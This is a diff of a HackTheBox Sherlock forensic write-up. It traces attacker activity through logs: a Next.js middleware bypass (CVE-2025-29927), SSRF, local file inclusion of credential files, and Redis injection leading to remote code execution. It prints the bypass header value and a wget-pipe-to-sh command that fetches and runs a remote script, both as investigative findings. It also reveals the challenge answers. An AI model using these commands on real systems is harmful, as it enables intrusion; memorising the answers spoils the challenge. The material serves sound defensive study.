@@ -21,14 +21,17 @@ we will have 5 log files to investigate from
 
 Since Next.js is React-based full-stack framework so we could inspect the `interface.log` to find out the version and also the local port that Next.js-based application was running on the server as shown in the image above.
 
-```
-15.1.0
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>15.1.0</code></pre>
+</details>
 
 >Task 2: What local port is the Next.js-based application running on?
-```
-3000
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>3000</code></pre>
+</details>
 
 >Task 3: A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?
 
@@ -44,9 +47,10 @@ An article published on [Project Discovery](https://projectdiscovery.io/blog/nex
 
 The article also explained how this template works which will help us on this sherlock as well! 
 
-```
-CVE-2025-29927
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>CVE-2025-29927</code></pre>
+</details>
 
 >Task 4: The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?
 
@@ -58,9 +62,10 @@ Lets check out the `access.log` file which we can see that there is only a singl
 
 Then we can read the content of the log file which we can see that the first HTTP response beside `/` happened at 11:37:44.
 
-```
-main-app.js
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>main-app.js</code></pre>
+</details>
 
 >Task 5: Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?
 
@@ -68,9 +73,10 @@ main-app.js
 
 We can see that after the attacker discovered main page of this Next.js application, an api endpoint was requested constantly by the attacker and the first 5 requests are resulted in Unauthorized response.
 
-```
-/api/bci/analytics
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/api/bci/analytics</code></pre>
+</details>
 
 >Task 6: How many requests to this endpoint have resulted in an "Unauthorized" response?
 
@@ -78,9 +84,10 @@ We can see that after the attacker discovered main page of this Next.js applicat
 
 We know that the first 5 request to this api endpoint resulted in Unauthorized response but is there more?, the result from `grep 401 access.log` command shows that there are no more than this.
 
-```
-5
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>5</code></pre>
+</details>
 
 >Task 7: When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?
 
@@ -88,9 +95,10 @@ We know that the first 5 request to this api endpoint resulted in Unauthorized r
 
 Then after those 5 unauthorized access, HTTP 200 status was seen from the 6th request and the rest and it indicates that the middleware authorization has been bypassed according to Nuclei template provides by [Project Discovery](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass).
 
-```
-2025-04-01 11:38:05
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2025-04-01 11:38:05</code></pre>
+</details>
 
 >Task 8: Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?
 
@@ -100,9 +108,10 @@ Since the Next.js running on this application is 15.1 which mean the value of `x
 
 and from `interface.log`, we can see that there are 4 attempts trying to get this vulnerability to work which was resulting to successfully exploited this vulnerability at the end.
 
-```
-x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code></pre>
+</details>
 
 >Task 9: The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?
 
@@ -110,9 +119,10 @@ x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 
 We can inspect the `data-api.log` file which we can see that the attacker used curl to trigger SSRF vulnerability and discovered another internal API on port 4000 which attacker then proceed to find other endpoint on this API.
 
-```
-4000
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>4000</code></pre>
+</details>
 
 >Task 10: After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?
 
@@ -120,9 +130,10 @@ We can inspect the `data-api.log` file which we can see that the attacker used c
 
 We could keep scrolling until we finally see the payload that resemble Local File Inclusion vulnerability exploitation payload from `/logs` endpoint which attacker found that he could leverage `logFile` variable on this endpoint to list file from the server.
 
-```
-/logs
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/logs</code></pre>
+</details>
 
 >Task 11: When the vulnerable endpoint found was used maliciously for the first time?
 
@@ -130,14 +141,17 @@ We could keep scrolling until we finally see the payload that resemble Local Fil
 
 We can see that the attacker started with `/etc/passwd` first then went to `/proc/self/environ` later.
 
-```
-2025-04-01 11:39:01
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2025-04-01 11:39:01</code></pre>
+</details>
 
 >Task 12: What is the attack name the endpoint is vulnerable to?
-```
-Local File Inclusion
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>Local File Inclusion</code></pre>
+</details>
 
 >Task 13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?
 
@@ -145,9 +159,10 @@ Local File Inclusion
 
 Lastly the attacker then used LFI to get secret key file from tmp directory before went to access Redis with the key obtained.
 
-```
-secret.key
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>secret.key</code></pre>
+</details>
 
 >Task 14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
 
@@ -155,9 +170,10 @@ secret.key
 
 From redis log, we can see that the attacker executed base64 command after he successfully compromised secret key to access Redis.
 
-```
-OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb</code></pre>
+</details>
 
 >Task 15: Once decoded, what is the command?
 
@@ -169,9 +185,10 @@ We can copy the base64 to decode it directly with CyberChef which we can see tha
 
 We could also find the same command from `bci-device.log` which gave us an extra context that this command did not work due to the missing `wget` binary on the server.
 
-```
-wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>wget http://185.202.2.147/h4Pln4/run.sh -O- | sh</code></pre>
+</details>
 
 https://labs.hackthebox.com/achievement/sherlock/1438364/879
 
